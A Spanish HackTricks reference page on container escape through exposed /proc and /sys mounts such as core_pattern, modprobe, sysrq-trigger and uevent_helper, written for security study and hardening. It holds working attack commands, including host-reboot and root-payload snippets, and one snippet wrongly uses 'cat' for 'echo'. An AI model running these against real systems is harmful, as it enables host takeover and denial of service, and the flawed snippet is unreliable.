<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


(_**Esta información fue tomada de**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

Debido a la falta de soporte de espacio de nombres, la exposición de `/proc` y `/sys` ofrece una superficie de ataque significativa y divulgación de información. Numerosos archivos dentro de `procfs` y `sysfs` presentan un riesgo de escape del contenedor, modificación del host o divulgación básica de información que podría facilitar otros ataques.

Para abusar de estas técnicas podría ser suficiente con **configurar incorrectamente algo como `-v /proc:/host/proc`** ya que AppArmor no protege `/host/proc` porque **AppArmor se basa en la ruta**

# procfs

## /proc/sys

`/proc/sys` típicamente permite el acceso para modificar variables del kernel, a menudo controladas a través de `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) define un programa que se ejecuta en la generación de archivos core (típicamente un fallo de programa) y se le pasa el archivo core como entrada estándar si el primer carácter de este archivo es un símbolo de tubería `|`. Este programa es ejecutado por el usuario root y permitirá hasta 128 bytes de argumentos de línea de comandos. Esto permitiría la ejecución trivial de código dentro del host del contenedor dado cualquier fallo y generación de archivo core (que puede ser simplemente descartado durante una miríada de acciones maliciosas).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contiene la ruta al cargador de módulos del kernel, que se llama cuando se carga un módulo del kernel, como a través del comando [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). Se puede obtener ejecución de código realizando cualquier acción que haga que el kernel intente cargar un módulo del kernel (como usar la API de criptografía para cargar un módulo criptográfico actualmente no cargado, o usar ifconfig para cargar un módulo de red para un dispositivo que actualmente no se está utilizando).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) es una bandera global que determina si el kernel entrará en pánico cuando se encuentre con una condición de Memoria Insuficiente (OOM) (en lugar de invocar al asesino de OOM). Esto es más un ataque de Denegación de Servicio (DoS) que una fuga de contenedor, pero no menos expone una capacidad que solo debería estar disponible para el host.

### /proc/sys/fs

[/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) el directorio contiene una variedad de opciones e información sobre varios aspectos del sistema de archivos, incluyendo cuota, manejador de archivos, inode y información de dentry. El acceso de escritura a este directorio permitiría varios ataques de denegación de servicio contra el host.

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permite ejecutar formatos binarios diversos, lo que típicamente significa que varios **intérpretes pueden ser registrados para formatos binarios no nativos** (como Java) basados en su número mágico. Puedes hacer que el kernel ejecute un binario registrándolo como manejadores.\
Puedes encontrar un exploit en [https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc): _Rootkit del pobre, aprovecha la opción_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _de_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _para escalar privilegios a través de cualquier binario suid (y obtener una shell de root) si `/proc/sys/fs/binfmt_misc/register` es escribible._

Para una explicación más profunda de esta técnica, consulta [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) dependiendo de la configuración de `CONFIG_IKCONFIG_PROC`, esto expone una versión comprimida de las opciones de configuración del kernel para el kernel en ejecución. Esto puede permitir que un contenedor comprometido o malicioso descubra fácilmente y apunte a áreas vulnerables habilitadas en el kernel.

## /proc/sysrq-trigger

`Sysrq` es un mecanismo antiguo que puede ser invocado a través de una combinación especial de teclado `SysRq`. Esto puede permitir un reinicio inmediato del sistema, emisión de `sync(2)`, remontar todos los sistemas de archivos como solo lectura, invocar depuradores del kernel y otras operaciones.

Si el invitado no está debidamente aislado, puede activar los comandos [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) escribiendo caracteres en el archivo `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) puede exponer mensajes del búfer de anillo del kernel normalmente accesibles a través de `dmesg`. La exposición de esta información puede ayudar en el desarrollo de exploits de kernel, provocar fugas de direcciones del kernel (que podrían usarse para ayudar a derrotar la Randomización del Espacio de Direcciones del Kernel (KASLR)), y ser una fuente de divulgación de información general sobre el kernel, hardware, paquetes bloqueados y otros detalles del sistema.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contiene una lista de símbolos exportados por el kernel y sus ubicaciones de dirección para módulos dinámicos y cargables. Esto también incluye la ubicación de la imagen del kernel en la memoria física, lo cual es útil para el desarrollo de exploits de kernel. A partir de estas ubicaciones, se puede localizar la dirección base o el desplazamiento del kernel, que se puede utilizar para superar la Randomización del Espacio de Direcciones del Kernel (KASLR).

Para sistemas con `kptr_restrict` configurado en `1` o `2`, este archivo existirá pero no proporcionará ninguna información de dirección (aunque el orden en el que se enumeran los símbolos es idéntico al orden en la memoria).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expone interfaces al dispositivo de memoria del kernel `/dev/mem`. Aunque el Namespace de PID puede proteger de algunos ataques a través de este vector `procfs`, esta área ha sido históricamente vulnerable, luego se consideró segura y nuevamente se encontró que era [vulnerable](https://git.zx2c4.com/CVE-2012-0056/about/) para la escalada de privilegios.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) representa la memoria física del sistema y está en un formato de núcleo ELF (típicamente encontrado en archivos de volcado de memoria). No permite escribir en dicha memoria. La capacidad de leer este archivo (restringido a usuarios privilegiados) puede provocar la fuga de contenidos de memoria del sistema anfitrión y otros contenedores.

El gran tamaño de archivo reportado representa la cantidad máxima de memoria físicamente direccionable para la arquitectura, y puede causar problemas al leerlo (o caídas dependiendo de la fragilidad del software).

[Volcado de /proc/kcore en 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` es una interfaz alternativa para [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (cuyo acceso directo está bloqueado por la lista blanca de dispositivos de cgroup), que es un archivo de dispositivo de caracteres que representa la memoria virtual del kernel. Permite tanto la lectura como la escritura, permitiendo la modificación directa de la memoria del kernel.

## /proc/mem

`/proc/mem` es una interfaz alternativa para [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (cuyo acceso directo está bloqueado por la lista blanca de dispositivos de cgroup), que es un archivo de dispositivo de caracteres que representa la memoria física del sistema. Permite tanto la lectura como la escritura, permitiendo la modificación de toda la memoria. (Requiere un poco más de delicadeza que `kmem`, ya que las direcciones virtuales deben resolverse a direcciones físicas primero).

## /proc/sched\_debug

`/proc/sched_debug` es un archivo especial que devuelve información sobre la programación de procesos para todo el sistema. Esta información incluye nombres de procesos e identificadores de procesos de todos los namespaces además de identificadores de cgroup de procesos. Esto efectivamente elude las protecciones del Namespace de PID y es legible por otros/mundo, por lo que también puede ser explotado en contenedores no privilegiados.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contiene información sobre puntos de montaje en el namespace de montaje del proceso. Expone la ubicación del `rootfs` del contenedor o imagen.

# sysfs

## /sys/kernel/uevent\_helper

Los `uevents` son eventos desencadenados por el kernel cuando se agrega o se elimina un dispositivo. Notablemente, la ruta para el `uevent_helper` se puede modificar escribiendo en `/sys/kernel/uevent_helper`. Luego, cuando se desencadena un `uevent` (lo cual también se puede hacer desde el espacio de usuario escribiendo en archivos como `/sys/class/mem/null/uevent`), el `uevent_helper` malicioso se ejecuta.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Acceso a ACPI y varios ajustes de hardware para el control de temperatura, típicamente encontrado en laptops o placas madre para juegos. Esto puede permitir ataques de DoS contra el host del contenedor, que incluso podrían llevar a daño físico.

## /sys/kernel/vmcoreinfo

Este archivo puede filtrar direcciones del kernel que podrían ser utilizadas para derrotar KASLR.

## /sys/kernel/security

En `/sys/kernel/security` se monta la interfaz `securityfs`, que permite la configuración de Módulos de Seguridad de Linux. Esto permite la configuración de [políticas de AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), y por lo tanto el acceso a esto puede permitir que un contenedor desactive su sistema MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expone interfaces para interactuar con variables EFI en NVRAM. Aunque esto no es típicamente relevante para la mayoría de los servidores, EFI se está volviendo cada vez más popular. Las debilidades en los permisos incluso han llevado a algunos laptops a quedar inservibles.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` proporciona una interfaz para escribir en la NVRAM utilizada para argumentos de arranque UEFI. Modificarlos puede hacer que la máquina anfitriona no arranque.

## /sys/kernel/debug

`debugfs` proporciona una interfaz "sin reglas" mediante la cual el kernel (o módulos del kernel) pueden crear interfaces de depuración accesibles desde el espacio de usuario. Ha tenido varios problemas de seguridad en el pasado, y las directrices "sin reglas" detrás del sistema de archivos a menudo han entrado en conflicto con las restricciones de seguridad.

# Referencias

* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
